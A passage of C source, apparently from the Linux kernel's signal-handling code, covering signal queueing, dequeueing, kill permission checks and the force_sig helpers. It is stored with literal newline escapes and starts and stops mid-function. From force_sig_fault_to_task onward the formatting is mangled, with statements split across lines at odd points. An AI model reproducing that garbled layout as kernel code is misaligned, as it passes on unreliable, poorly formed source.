}\n  return false;\n}\n\nvoid task_join_group_stop(struct task_struct *task) {\n  unsigned long mask = current->jobctl & JOBCTL_STOP_SIGMASK;\n  struct signal_struct *sig = current->signal;\n\n  if (sig->group_stop_count) {\n    sig->group_stop_count++;\n    mask |= JOBCTL_STOP_CONSUME;\n  } else if (!(sig->flags & SIGNAL_STOP_STOPPED))\n    return;\n\n  task_set_jobctl_pending(task, mask | JOBCTL_STOP_PENDING);\n}\n\nstatic struct sigqueue *\n__sigqueue_alloc(int sig, struct task_struct *t, gfp_t gfp_flags,\n                 int override_rlimit, const unsigned int sigqueue_flags) {\n  struct sigqueue *q = NULL;\n  struct ucounts *ucounts = NULL;\n  long sigpending;\n\n  rcu_read_lock();\n  ucounts = task_ucounts(t);\n  sigpending = inc_rlimit_get_ucounts(ucounts, UCOUNT_RLIMIT_SIGPENDING);\n  rcu_read_unlock();\n  if (!sigpending)\n    return NULL;\n\n  if (override_rlimit ||\n      likely(sigpending <= task_rlimit(t, RLIMIT_SIGPENDING))) {\n    q = kmem_cache_alloc(sigqueue_cachep, gfp_flags);\n  } else {\n    print_dropped_signal(sig);\n  }\n\n  if (unlikely(q == NULL)) {\n    dec_rlimit_put_ucounts(ucounts, UCOUNT_RLIMIT_SIGPENDING);\n  } else {\n    INIT_LIST_HEAD(&q->list);\n    q->flags = sigqueue_flags;\n    q->ucounts = ucounts;\n  }\n  return q;\n}\n\nstatic void __sigqueue_free(struct sigqueue *q) {\n  if (q->flags & SIGQUEUE_PREALLOC)\n    return;\n  if (q->ucounts) {\n    dec_rlimit_put_ucounts(q->ucounts, UCOUNT_RLIMIT_SIGPENDING);\n    q->ucounts = NULL;\n  }\n  kmem_cache_free(sigqueue_cachep, q);\n}\n\nvoid flush_sigqueue(struct sigpending *queue) {\n  struct sigqueue *q;\n\n  sigemptyset(&queue->signal);\n  while (!list_empty(&queue->list)) {\n    q = list_entry(queue->list.next,\n    struct sigqueue , list);\n    list_del_init(&q->list);\n    __sigqueue_free(q);\n  }\n}\n\nvoid flush_signals(struct task_struct *t) {\n  unsigned long flags;\n\n  spin_lock_irqsave(&t->sighand->siglock, flags);\n  clear_tsk_thread_flag(t, TIF_SIGPENDING);\n  flush_sigqueue(&t->pending);\n  flush_sigqueue(&t->signal->shared_pending);\n  spin_unlock_irqrestore(&t->sighand->siglock, flags);\n}\n\nEXPORT_SYMBOL(flush_signals);\n\n#ifdef CONFIG_POSIX_TIMERS\nstatic void __flush_itimer_signals(struct sigpending *pending)\n{\n  sigset_t signal, retain;\n  struct sigqueue *q, *n;\n\n  signal = pending->signal;\n  sigemptyset(&retain);\n\n  list_for_each_entry_safe(q, n, &pending->list, list) {\n    int sig = q->info.si_signo;\n\n    if (likely(q->info.si_code != SI_TIMER)) {\n      sigaddset(&retain, sig);\n    } else {\n      sigdelset(&signal, sig);\n      list_del_init(&q->list);\n      __sigqueue_free(q);\n    }\n  }\n\n  sigorsets(&pending->signal, &signal, &retain);\n}\n\nvoid flush_itimer_signals(void)\n{\n  struct task_struct *tsk = current;\n  unsigned long flags;\n\n  spin_lock_irqsave(&tsk->sighand->siglock, flags);\n  __flush_itimer_signals(&tsk->pending);\n  __flush_itimer_signals(&tsk->signal->shared_pending);\n  spin_unlock_irqrestore(&tsk->sighand->siglock, flags);\n}\n#endif\n\nvoid ignore_signals(struct task_struct *t) {\n  int i;\n\n  for (i = 0; i < _NSIG; ++i)\n    t->sighand->action[i].sa.sa_handler = SIG_IGN;\n\n  flush_signals(t);\n}\n\nvoid\nflush_signal_handlers(struct task_struct *t, int force_default) {\n  int i;\n  struct k_sigaction *ka = &t->sighand->action[0];\n  for (i = _NSIG; i != 0; i--) {\n    if (force_default || ka->sa.sa_handler != SIG_IGN)\n      ka->sa.sa_handler = SIG_DFL;\n    ka->sa.sa_flags = 0;\n#ifdef __ARCH_HAS_SA_RESTORER\n    ka->sa.sa_restorer = NULL;\n#endif\n    sigemptyset(&ka->sa.sa_mask);\n    ka++;\n  }\n}\n\nbool unhandled_signal(struct task_struct *tsk, int sig) {\n  void __user\n  *handler = tsk->sighand->action[sig - 1].sa.sa_handler;\n  if (is_global_init(tsk))\n    return true;\n\n  if (handler != SIG_IGN && handler != SIG_DFL)\n    return false;\n\n  return !tsk->ptrace;\n}\n\nstatic void\ncollect_signal(int sig, struct sigpending *list, kernel_siginfo_t *info,\n               bool *resched_timer) {\n  struct sigqueue *q, *first = NULL;\n\n  list_for_each_entry(q, &list->list, list)\n  {\n    if (q->info.si_signo == sig) {\n      if (first)\n        goto still_pending;\n      first = q;\n    }\n  }\n\n  sigdelset(&list->signal, sig);\n\n  if (first) {\n    still_pending:\n    list_del_init(&first->list);\n    copy_siginfo(info, &first->info);\n\n    *resched_timer =\n        (first->flags & SIGQUEUE_PREALLOC) &&\n        (info->si_code == SI_TIMER) &&\n        (info->si_sys_private);\n\n    __sigqueue_free(first);\n  } else {\n    clear_siginfo(info);\n    info->si_signo = sig;\n    info->si_errno = 0;\n    info->si_code = SI_USER;\n    info->si_pid = 0;\n    info->si_uid = 0;\n  }\n}\n\nstatic int __dequeue_signal(struct sigpending *pending, sigset_t *mask,\n                            kernel_siginfo_t *info, bool *resched_timer) {\n  int sig = next_signal(pending, mask);\n\n  if (sig)\n    collect_signal(sig, pending, info, resched_timer);\n  return sig;\n}\n\nint dequeue_signal(struct task_struct *tsk, sigset_t *mask,\n                   kernel_siginfo_t *info, enum pid_type *type) {\n  bool resched_timer = false;\n  int signr;\n\n  *type = PIDTYPE_PID;\n  signr = __dequeue_signal(&tsk->pending, mask, info, &resched_timer);\n  if (!signr) {\n    *type = PIDTYPE_TGID;\n    signr = __dequeue_signal(&tsk->signal->shared_pending,\n                             mask, info, &resched_timer);\n#ifdef CONFIG_POSIX_TIMERS\n    if (unlikely(signr == SIGALRM)) {\n      struct hrtimer *tmr = &tsk->signal->real_timer;\n\n      if (!hrtimer_is_queued(tmr) &&\n          tsk->signal->it_real_incr != 0) {\n        hrtimer_forward(tmr, tmr->base->get_time(),\n            tsk->signal->it_real_incr);\n        hrtimer_restart(tmr);\n      }\n    }\n#endif\n  }\n\n  recalc_sigpending();\n  if (!signr)\n    return 0;\n\n  if (unlikely(sig_kernel_stop(signr))) {\n    current->jobctl |= JOBCTL_STOP_DEQUEUED;\n  }\n#ifdef CONFIG_POSIX_TIMERS\n  if (resched_timer) {\n    spin_unlock(&tsk->sighand->siglock);\n    posixtimer_rearm(info);\n    spin_lock(&tsk->sighand->siglock);\n\n\n    info->si_sys_private = 0;\n  }\n#endif\n  return signr;\n}\n\nEXPORT_SYMBOL_GPL(dequeue_signal);\n\nstatic int dequeue_synchronous_signal(kernel_siginfo_t *info) {\n  struct task_struct *tsk = current;\n  struct sigpending *pending = &tsk->pending;\n  struct sigqueue *q, *sync = NULL;\n\n  if (!((pending->signal.sig[0] & ~tsk->blocked.sig[0]) & SYNCHRONOUS_MASK))\n    return 0;\n\n  list_for_each_entry(q, &pending->list, list)\n  {\n\n    if ((q->info.si_code > SI_USER) &&\n        (sigmask(q->info.si_signo) & SYNCHRONOUS_MASK)) {\n      sync = q;\n      goto next;\n    }\n  }\n  return 0;\n  next:\n  list_for_each_entry_continue(q, &pending->list, list)\n  {\n    if (q->info.si_signo == sync->info.si_signo)\n      goto still_pending;\n  }\n\n  sigdelset(&pending->signal, sync->info.si_signo);\n  recalc_sigpending();\n  still_pending:\n  list_del_init(&sync->list);\n  copy_siginfo(info, &sync->info);\n  __sigqueue_free(sync);\n  return info->si_signo;\n}\n\nvoid signal_wake_up_state(struct task_struct *t, unsigned int state) {\n  set_tsk_thread_flag(t, TIF_SIGPENDING);\n  if (!wake_up_state(t, state | TASK_INTERRUPTIBLE))\n    kick_process(t);\n}\n\nstatic void flush_sigqueue_mask(sigset_t *mask, struct sigpending *s) {\n  struct sigqueue *q, *n;\n  sigset_t m;\n\n  sigandsets(&m, mask, &s->signal);\n  if (sigisemptyset(&m))\n    return;\n\n  sigandnsets(&s->signal, &s->signal, mask);\n  list_for_each_entry_safe(q, n, &s->list, list)\n  {\n    if (sigismember(mask, q->info.si_signo)) {\n      list_del_init(&q->list);\n      __sigqueue_free(q);\n    }\n  }\n}\n\nstatic inline int is_si_special(const struct kernel_siginfo *info) {\n  return info <= SEND_SIG_PRIV;\n}\n\nstatic inline bool si_fromuser(const struct kernel_siginfo *info) {\n  return info == SEND_SIG_NOINFO ||\n         (!is_si_special(info) && SI_FROMUSER(info));\n}\n\nstatic bool kill_ok_by_cred(struct task_struct *t) {\n  const struct cred *cred = current_cred();\n  const struct cred *tcred = __task_cred(t);\n\n  return uid_eq(cred->euid, tcred->suid) ||\n         uid_eq(cred->euid, tcred->uid) ||\n         uid_eq(cred->uid, tcred->suid) ||\n         uid_eq(cred->uid, tcred->uid) ||\n         ns_capable(tcred->user_ns, CAP_KILL);\n}\n\nstatic int check_kill_permission(int sig, struct kernel_siginfo *info,\n                                 struct task_struct *t) {\n  struct pid *sid;\n  int error;\n\n  if (!valid_signal(sig))\n    return -EINVAL;\n\n  if (!si_fromuser(info))\n    return 0;\n\n  error = audit_signal_info(sig, t);\n  if (error)\n    return error;\n\n  if (!same_thread_group(current, t) &&\n      !kill_ok_by_cred(t)) {\n    switch (sig) {\n      case SIGCONT:\n        sid = task_session(t);\n        if (!sid || sid == task_session(current))\n          break;\n        fallthrough;\n      default:\n        return -EPERM;\n    }\n  }\n\n  return security_task_kill(t, info, sig, NULL);\n}\n\nstatic void ptrace_trap_notify(struct task_struct *t) {\n  WARN_ON_ONCE(!(t->ptrace & PT_SEIZED));\n  assert_spin_locked(&t->sighand->siglock);\n\n  task_set_jobctl_pending(t, JOBCTL_TRAP_NOTIFY);\n  ptrace_signal_wake_up(t, t->jobctl & JOBCTL_LISTENING);\n}\n\nstatic bool prepare_signal(int sig, struct task_struct *p, bool force) {\n  struct signal_struct *signal = p->signal;\n  struct task_struct *t;\n  sigset_t flush;\n\n  if (signal->flags & SIGNAL_GROUP_EXIT) {\n    if (signal->core_state)\n      return sig == SIGKILL;\n  } else if (sig_kernel_stop(sig)) {\n    siginitset(&flush, sigmask(SIGCONT));\n    flush_sigqueue_mask(&flush, &signal->shared_pending);\n    for_each_thread(p, t)\n    flush_sigqueue_mask(&flush, &t->pending);\n  } else if (sig == SIGCONT) {\n    unsigned int why;\n    siginitset(&flush, SIG_KERNEL_STOP_MASK);\n    flush_sigqueue_mask(&flush, &signal->shared_pending);\n    for_each_thread(p, t)\n    {\n      flush_sigqueue_mask(&flush, &t->pending);\n      task_clear_jobctl_pending(t, JOBCTL_STOP_PENDING);\n      if (likely(!(t->ptrace & PT_SEIZED)))\n        wake_up_state(t, __TASK_STOPPED);\n      else\n        ptrace_trap_notify(t);\n    }\n\n    why = 0;\n    if (signal->flags & SIGNAL_STOP_STOPPED)\n      why |= SIGNAL_CLD_CONTINUED;\n    else if (signal->group_stop_count)\n      why |= SIGNAL_CLD_STOPPED;\n\n    if (why) {\n      signal_set_stop_flags(signal, why | SIGNAL_STOP_CONTINUED);\n      signal->group_stop_count = 0;\n      signal->group_exit_code = 0;\n    }\n  }\n\n  return !sig_ignored(p, sig, force);\n}\n\nstatic inline bool wants_signal(int sig, struct task_struct *p) {\n  if (sigismember(&p->blocked, sig))\n    return false;\n\n  if (p->flags & PF_EXITING)\n    return false;\n\n  if (sig == SIGKILL)\n    return true;\n\n  if (task_is_stopped_or_traced(p))\n    return false;\n\n  return task_curr(p) || !task_sigpending(p);\n}\n\nstatic void\ncomplete_signal(int sig, struct task_struct *p, enum pid_type type) {\n  struct signal_struct *signal = p->signal;\n  struct task_struct *t;\n\n  if (wants_signal(sig, p))\n    t = p;\n  else if ((type == PIDTYPE_PID) || thread_group_empty(p))\n    return;\n  else {\n    t = signal->curr_target;\n    while (!wants_signal(sig, t)) {\n      t = next_thread(t);\n      if (t == signal->curr_target)\n        return;\n    }\n    signal->curr_target = t;\n  }\n\n  if (sig_fatal(p, sig) &&\n      (signal->core_state || !(signal->flags & SIGNAL_GROUP_EXIT)) &&\n      !sigismember(&t->real_blocked, sig) &&\n      (sig == SIGKILL || !p->ptrace)) {\n    if (!sig_kernel_coredump(sig)) {\n      signal->flags = SIGNAL_GROUP_EXIT;\n      signal->group_exit_code = sig;\n      signal->group_stop_count = 0;\n      t = p;\n      do {\n        task_clear_jobctl_pending(t, JOBCTL_PENDING_MASK);\n        sigaddset(&t->pending.signal, SIGKILL);\n        signal_wake_up(t, 1);\n      }\n      while_each_thread(p, t);\n      return;\n    }\n  }\n\n  signal_wake_up(t, sig == SIGKILL);\n  return;\n}\n\nstatic inline bool legacy_queue(struct sigpending *signals, int sig) {\n  return (sig < SIGRTMIN) && sigismember(&signals->signal, sig);\n}\n\nstatic int\n__send_signal(int sig, struct kernel_siginfo *info, struct task_struct *t,\n              enum pid_type type, bool force) {\n  struct sigpending *pending;\n  struct sigqueue *q;\n  int override_rlimit;\n  int ret = 0, result;\n\n  assert_spin_locked(&t->sighand->siglock);\n\n  result = TRACE_SIGNAL_IGNORED;\n  if (!prepare_signal(sig, t, force))\n    goto ret;\n\n  pending = (type != PIDTYPE_PID) ? &t->signal->shared_pending : &t->pending;\n  result = TRACE_SIGNAL_ALREADY_PENDING;\n  if (legacy_queue(pending, sig))\n    goto ret;\n\n  result = TRACE_SIGNAL_DELIVERED;\n\n  if ((sig == SIGKILL) || (t->flags & PF_KTHREAD))\n    goto out_set;\n\n  if (sig < SIGRTMIN)\n    override_rlimit = (is_si_special(info) || info->si_code >= 0);\n  else\n    override_rlimit = 0;\n\n  q = __sigqueue_alloc(sig, t, GFP_ATOMIC, override_rlimit, 0);\n\n  if (q) {\n    list_add_tail(&q->list, &pending->list);\n    switch ((unsigned long) info) {\n      case (unsigned long) SEND_SIG_NOINFO:\n        clear_siginfo(&q->info);\n        q->info.si_signo = sig;\n        q->info.si_errno = 0;\n        q->info.si_code = SI_USER;\n        q->info.si_pid = task_tgid_nr_ns(current,\n                                         task_active_pid_ns(t));\n        rcu_read_lock();\n        q->info.si_uid =\n            from_kuid_munged(task_cred_xxx(t, user_ns),\n                             current_uid());\n        rcu_read_unlock();\n        break;\n      case (unsigned long) SEND_SIG_PRIV:\n        clear_siginfo(&q->info);\n        q->info.si_signo = sig;\n        q->info.si_errno = 0;\n        q->info.si_code = SI_KERNEL;\n        q->info.si_pid = 0;\n        q->info.si_uid = 0;\n        break;\n      default:\n        copy_siginfo(&q->info, info);\n        break;\n    }\n  } else if (!is_si_special(info) &&\n             sig >= SIGRTMIN && info->si_code != SI_USER) {\n    result = TRACE_SIGNAL_OVERFLOW_FAIL;\n    ret = -EAGAIN;\n    goto ret;\n  } else {\n    result = TRACE_SIGNAL_LOSE_INFO;\n  }\n\n  out_set:\n  signalfd_notify(t, sig);\n  sigaddset(&pending->signal, sig);\n\n  if (type > PIDTYPE_TGID) {\n    struct multiprocess_signals *delayed;\n    hlist_for_each_entry(delayed, &t->signal->multiprocess, node)\n    {\n      sigset_t *signal = &delayed->signal;\n\n      if (sig == SIGCONT)\n        sigdelsetmask(signal, SIG_KERNEL_STOP_MASK);\n      else if (sig_kernel_stop(sig))\n        sigdelset(signal, SIGCONT);\n      sigaddset(signal, sig);\n    }\n  }\n\n  complete_signal(sig, t, type);\n  ret:\n  trace_signal_generate(sig, info, t, type != PIDTYPE_PID, result);\n  return ret;\n}\n\nstatic inline bool has_si_pid_and_uid(struct kernel_siginfo *info) {\n  bool ret = false;\n  switch (siginfo_layout(info->si_signo, info->si_code)) {\n    case SIL_KILL:\n    case SIL_CHLD:\n    case SIL_RT:\n      ret = true;\n      break;\n    case SIL_TIMER:\n    case SIL_POLL:\n    case SIL_FAULT:\n    case SIL_FAULT_TRAPNO:\n    case SIL_FAULT_MCEERR:\n    case SIL_FAULT_BNDERR:\n    case SIL_FAULT_PKUERR:\n    case SIL_FAULT_PERF_EVENT:\n    case SIL_SYS:\n      ret = false;\n      break;\n  }\n  return ret;\n}\n\nstatic int\nsend_signal(int sig, struct kernel_siginfo *info, struct task_struct *t,\n            enum pid_type type) {\n\n  bool force = false;\n\n  if (info == SEND_SIG_NOINFO) {\n\n    force = !task_pid_nr_ns(current, task_active_pid_ns(t));\n  } else if (info == SEND_SIG_PRIV) {\n\n    force = true;\n  } else if (has_si_pid_and_uid(info)) {\n\n    struct user_namespace *t_user_ns;\n\n    rcu_read_lock();\n    t_user_ns = task_cred_xxx(t, user_ns);\n    if (current_user_ns() != t_user_ns) {\n      kuid_t uid = make_kuid(current_user_ns(), info->si_uid);\n      info->si_uid = from_kuid_munged(t_user_ns, uid);\n    }\n    rcu_read_unlock();\n\n    force = (info->si_code == SI_KERNEL);\n\n    if (!task_pid_nr_ns(current, task_active_pid_ns(t))) {\n      info->si_pid = 0;\n      force = true;\n    }\n  }\n  return __send_signal(sig, info, t, type, force);\n}\n\nstatic void print_fatal_signal(int signr) {\n  struct pt_regs *regs = signal_pt_regs();\n  pr_info("potentially unexpected fatal signal %d.\\n", signr);\n\n#if defined(__i386__) && !defined(__arch_um__)\n  pr_info("code at %08lx: ", regs->ip);\n  {\n    int i;\n    for (i = 0; i < 16; i++) {\n      unsigned char insn;\n\n      if (get_user(insn, (unsigned char *)(regs->ip + i)))\n        break;\n      pr_cont("%02x ", insn);\n    }\n  }\n  pr_cont("\\n");\n#endif\n  preempt_disable();\n  show_regs(regs);\n  preempt_enable();\n}\n\nstatic int __init\n\nsetup_print_fatal_signals(char *str) {\n  get_option(&str, &print_fatal_signals);\n\n  return 1;\n}\n\n__setup("print-fatal-signals=", setup_print_fatal_signals);\n\nint\n__group_send_sig_info(int sig, struct kernel_siginfo *info,\n                      struct task_struct *p) {\n  return send_signal(sig, info, p, PIDTYPE_TGID);\n}\n\nint\ndo_send_sig_info(int sig, struct kernel_siginfo *info, struct task_struct *p,\n                 enum pid_type type) {\n  unsigned long flags;\n  int ret = -ESRCH;\n\n  if (lock_task_sighand(p, &flags)) {\n    ret = send_signal(sig, info, p, type);\n    unlock_task_sighand(p, &flags);\n  }\n\n  return ret;\n}\n\nenum sig_handler {\n  HANDLER_CURRENT,\n  HANDLER_SIG_DFL,\n  HANDLER_EXIT,\n};\n\n#ifdef CONFIG_RT_DELAYED_SIGNALS\nstatic inline bool force_sig_delayed(struct kernel_siginfo *info,\n             struct task_struct *t)\n{\n  if (!in_atomic())\n    return false;\n\n  if (WARN_ON_ONCE(t->forced_info.si_signo))\n    return true;\n\n  if (is_si_special(info)) {\n    WARN_ON_ONCE(info != SEND_SIG_PRIV);\n    t->forced_info.si_signo = info->si_signo;\n    t->forced_info.si_errno = 0;\n    t->forced_info.si_code = SI_KERNEL;\n    t->forced_info.si_pid = 0;\n    t->forced_info.si_uid = 0;\n  } else {\n    t->forced_info = *info;\n  }\n  set_tsk_thread_flag(t, TIF_NOTIFY_RESUME);\n  return true;\n}\n#else\n\nstatic inline bool force_sig_delayed(struct kernel_siginfo *info,\n                                     struct task_struct *t) {\n  return false;\n}\n\n#endif\n\nstatic int\nforce_sig_info_to_task(struct kernel_siginfo *info, struct task_struct *t,\n                       enum sig_handler handler) {\n  unsigned long int flags;\n  int ret, blocked, ignored;\n  struct k_sigaction *action;\n  int sig = info->si_signo;\n\n  if (force_sig_delayed(info, t))\n    return 0;\n\n  spin_lock_irqsave(&t->sighand->siglock, flags);\n  action = &t->sighand->action[sig - 1];\n  ignored = action->sa.sa_handler == SIG_IGN;\n  blocked = sigismember(&t->blocked, sig);\n  if (blocked || ignored || (handler != HANDLER_CURRENT)) {\n    action->sa.sa_handler = SIG_DFL;\n    if (handler == HANDLER_EXIT)\n      action->sa.sa_flags |= SA_IMMUTABLE;\n    if (blocked) {\n      sigdelset(&t->blocked, sig);\n      recalc_sigpending_and_wake(t);\n    }\n  }\n\n  if (action->sa.sa_handler == SIG_DFL &&\n      (!t->ptrace || (handler == HANDLER_EXIT)))\n    t->signal->flags &= ~SIGNAL_UNKILLABLE;\n  ret = send_signal(sig, info, t, PIDTYPE_PID);\n  spin_unlock_irqrestore(&t->sighand->siglock, flags);\n\n  return ret;\n}\n\nint force_sig_info(struct kernel_siginfo *info) {\n  return force_sig_info_to_task(info, current, HANDLER_CURRENT);\n}\n\nint zap_other_threads(struct task_struct *p) {\n  struct task_struct *t = p;\n  int count = 0;\n\n  p->signal->group_stop_count = 0;\n\n  while_each_thread(p, t)\n  {\n    task_clear_jobctl_pending(t, JOBCTL_PENDING_MASK);\n    count++;\n\n    if (t->exit_state)\n      continue;\n    sigaddset(&t->pending.signal, SIGKILL);\n    signal_wake_up(t, 1);\n  }\n\n  return count;\n}\n\nstruct sighand_struct *__lock_task_sighand(struct task_struct *tsk,\n                                           unsigned long *flags) {\n  struct sighand_struct *sighand;\n\n  rcu_read_lock();\n  for (;;) {\n    sighand = rcu_dereference(tsk->sighand);\n    if (unlikely(sighand == NULL))\n      break;\n\n    spin_lock_irqsave(&sighand->siglock, *flags);\n    if (likely(sighand == rcu_access_pointer(tsk->sighand)))\n      break;\n    spin_unlock_irqrestore(&sighand->siglock, *flags);\n  }\n  rcu_read_unlock();\n\n  return sighand;\n}\n\n#ifdef CONFIG_LOCKDEP\nvoid lockdep_assert_task_sighand_held(struct task_struct *task)\n{\n  struct sighand_struct *sighand;\n\n  rcu_read_lock();\n  sighand = rcu_dereference(task->sighand);\n  if (sighand)\n    lockdep_assert_held(&sighand->siglock);\n  else\n    WARN_ON_ONCE(1);\n  rcu_read_unlock();\n}\n#endif\n\nint group_send_sig_info(int sig, struct kernel_siginfo *info,\n                        struct task_struct *p, enum pid_type type) {\n  int ret;\n\n  rcu_read_lock();\n  ret = check_kill_permission(sig, info, p);\n  rcu_read_unlock();\n\n  if (!ret && sig)\n    ret = do_send_sig_info(sig, info, p, type);\n\n  return ret;\n}\n\nint __kill_pgrp_info(int sig, struct kernel_siginfo *info, struct pid *pgrp) {\n  struct task_struct *p = NULL;\n  int retval, success;\n\n  success = 0;\n  retval = -ESRCH;\n  do_each_pid_task(pgrp, PIDTYPE_PGID, p)\n  {\n    int err = group_send_sig_info(sig, info, p, PIDTYPE_PGID);\n    success |= !err;\n    retval = err;\n  }\n  while_each_pid_task(pgrp, PIDTYPE_PGID, p);\n  return success ? 0 : retval;\n}\n\nint kill_pid_info(int sig, struct kernel_siginfo *info, struct pid *pid) {\n  int error = -ESRCH;\n  struct task_struct *p;\n\n  for (;;) {\n    rcu_read_lock();\n    p = pid_task(pid, PIDTYPE_PID);\n    if (p)\n      error = group_send_sig_info(sig, info, p, PIDTYPE_TGID);\n    rcu_read_unlock();\n    if (likely(!p || error != -ESRCH))\n      return error;\n\n  }\n}\n\nstatic int kill_proc_info(int sig, struct kernel_siginfo *info, pid_t pid) {\n  int error;\n  rcu_read_lock();\n  error = kill_pid_info(sig, info, find_vpid(pid));\n  rcu_read_unlock();\n  return error;\n}\n\nstatic inline bool kill_as_cred_perm(const struct cred *cred,\n                                     struct task_struct *target) {\n  const struct cred *pcred = __task_cred(target);\n\n  return uid_eq(cred->euid, pcred->suid) ||\n         uid_eq(cred->euid, pcred->uid) ||\n         uid_eq(cred->uid, pcred->suid) ||\n         uid_eq(cred->uid, pcred->uid);\n}\n\nint kill_pid_usb_asyncio(int sig, int errno, sigval_t addr,\n                         struct pid *pid, const struct cred *cred) {\n  struct kernel_siginfo info;\n  struct task_struct *p;\n  unsigned long flags;\n  int ret = -EINVAL;\n\n  if (!valid_signal(sig))\n    return ret;\n\n  clear_siginfo(&info);\n  info.si_signo = sig;\n  info.si_errno = errno;\n  info.si_code = SI_ASYNCIO;\n  *((sigval_t * ) & info.si_pid) = addr;\n\n  rcu_read_lock();\n  p = pid_task(pid, PIDTYPE_PID);\n  if (!p) {\n    ret = -ESRCH;\n    goto out_unlock;\n  }\n  if (!kill_as_cred_perm(cred, p)) {\n    ret = -EPERM;\n    goto out_unlock;\n  }\n  ret = security_task_kill(p, &info, sig, cred);\n  if (ret)\n    goto out_unlock;\n\n  if (sig) {\n    if (lock_task_sighand(p, &flags)) {\n      ret = __send_signal(sig, &info, p, PIDTYPE_TGID, false);\n      unlock_task_sighand(p, &flags);\n    } else\n      ret = -ESRCH;\n  }\n  out_unlock:\n  rcu_read_unlock();\n  return ret;\n}\n\nEXPORT_SYMBOL_GPL(kill_pid_usb_asyncio);\n\nstatic int\nkill_something_info(int sig, struct kernel_siginfo *info, pid_t pid) {\n  int ret;\n\n  if (pid > 0)\n    return kill_proc_info(sig, info, pid);\n\n  if (pid == INT_MIN)\n    return -ESRCH;\n\n  read_lock(&tasklist_lock);\n  if (pid != -1) {\n    ret = __kill_pgrp_info(sig, info,\n                           pid ? find_vpid(-pid) : task_pgrp(current));\n  } else {\n    int retval = 0, count = 0;\n    struct task_struct *p;\n\n    for_each_process(p)\n    {\n      if (task_pid_vnr(p) > 1 &&\n          !same_thread_group(p, current)) {\n        int err = group_send_sig_info(sig, info, p,\n                                      PIDTYPE_MAX);\n        ++count;\n        if (err != -EPERM)\n          retval = err;\n      }\n    }\n    ret = count ? retval : -ESRCH;\n  }\n  read_unlock(&tasklist_lock);\n\n  return ret;\n}\n\nint send_sig_info(int sig, struct kernel_siginfo *info, struct task_struct *p) {\n\n  if (!valid_signal(sig))\n    return -EINVAL;\n\n  return do_send_sig_info(sig, info, p, PIDTYPE_PID);\n}\n\nEXPORT_SYMBOL(send_sig_info);\n\n#define __si_special(priv) \\\n  ((priv) ? SEND_SIG_PRIV : SEND_SIG_NOINFO)\n\nint\nsend_sig(int sig, struct task_struct *p, int priv) {\n  return send_sig_info(sig, __si_special(priv), p);\n}\n\nEXPORT_SYMBOL(send_sig);\n\nvoid force_sig(int sig) {\n  struct kernel_siginfo info;\n\n  clear_siginfo(&info);\n  info.si_signo = sig;\n  info.si_errno = 0;\n  info.si_code = SI_KERNEL;\n  info.si_pid = 0;\n  info.si_uid = 0;\n  force_sig_info(&info);\n}\n\nEXPORT_SYMBOL(force_sig);\n\nvoid force_fatal_sig(int sig) {\n  struct kernel_siginfo info;\n\n  clear_siginfo(&info);\n  info.si_signo = sig;\n  info.si_errno = 0;\n  info.si_code = SI_KERNEL;\n  info.si_pid = 0;\n  info.si_uid = 0;\n  force_sig_info_to_task(&info, current, HANDLER_SIG_DFL);\n}\n\nvoid force_exit_sig(int sig) {\n  struct kernel_siginfo info;\n\n  clear_siginfo(&info);\n  info.si_signo = sig;\n  info.si_errno = 0;\n  info.si_code = SI_KERNEL;\n  info.si_pid = 0;\n  info.si_uid = 0;\n  force_sig_info_to_task(&info, current, HANDLER_EXIT);\n}\n\nvoid force_sigsegv(int sig) {\n  if (sig == SIGSEGV)\n    force_fatal_sig(SIGSEGV);\n  else\n    force_sig(SIGSEGV);\n}\n\nint force_sig_fault_to_task(int sig, int code, void __user\n\n*\n\naddr\n    ___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)\n,\n\nstruct task_struct *t\n)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = sig;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = code;\ninfo.\nsi_addr = addr;\n#ifdef __ia64__\ninfo.si_imm = imm;\ninfo.si_flags = flags;\ninfo.si_isr = isr;\n#endif\nreturn\nforce_sig_info_to_task(&info, t, HANDLER_CURRENT\n);\n}\n\nint force_sig_fault(int sig, int code, void __user\n\n*\n\naddr\n___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)\n\n)\n{\nreturn\nforce_sig_fault_to_task(sig, code, addr\n___ARCH_SI_IA64(imm, flags, isr\n), current);\n}\n\nint send_sig_fault(int sig, int code, void __user\n\n*\n\naddr\n    ___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)\n,\n\nstruct task_struct *t\n)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = sig;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = code;\ninfo.\nsi_addr = addr;\n#ifdef __ia64__\ninfo.si_imm = imm;\ninfo.si_flags = flags;\ninfo.si_isr = isr;\n#endif\nreturn\nsend_sig_info(info\n.si_signo, &info, t);\n}\n\nint force_sig_mceerr(int code, void __user\n\n*addr,\nshort lsb\n)\n{\nstruct kernel_siginfo info;\n\nWARN_ON((code\n!= BUS_MCEERR_AO) && (code != BUS_MCEERR_AR));\nclear_siginfo(&info);\ninfo.\nsi_signo = SIGBUS;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = code;\ninfo.\nsi_addr = addr;\ninfo.\nsi_addr_lsb = lsb;\nreturn\nforce_sig_info(&info);\n}\n\nint send_sig_mceerr(int code, void __user\n\n*addr,\nshort lsb,\nstruct task_struct *t\n)\n{\nstruct kernel_siginfo info;\n\nWARN_ON((code\n!= BUS_MCEERR_AO) && (code != BUS_MCEERR_AR));\nclear_siginfo(&info);\ninfo.\nsi_signo = SIGBUS;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = code;\ninfo.\nsi_addr = addr;\ninfo.\nsi_addr_lsb = lsb;\nreturn\nsend_sig_info(info\n.si_signo, &info, t);\n}\nEXPORT_SYMBOL(send_sig_mceerr);\n\nint force_sig_bnderr(void __user\n\n*addr,\nvoid __user\n*lower,\nvoid __user\n*upper)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = SIGSEGV;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = SEGV_BNDERR;\ninfo.\nsi_addr = addr;\ninfo.\nsi_lower = lower;\ninfo.\nsi_upper = upper;\nreturn\nforce_sig_info(&info);\n}\n\n#ifdef SEGV_PKUERR\nint force_sig_pkuerr(void __user *addr, u32 pkey)\n{\n  struct kernel_siginfo info;\n\n  clear_siginfo(&info);\n  info.si_signo = 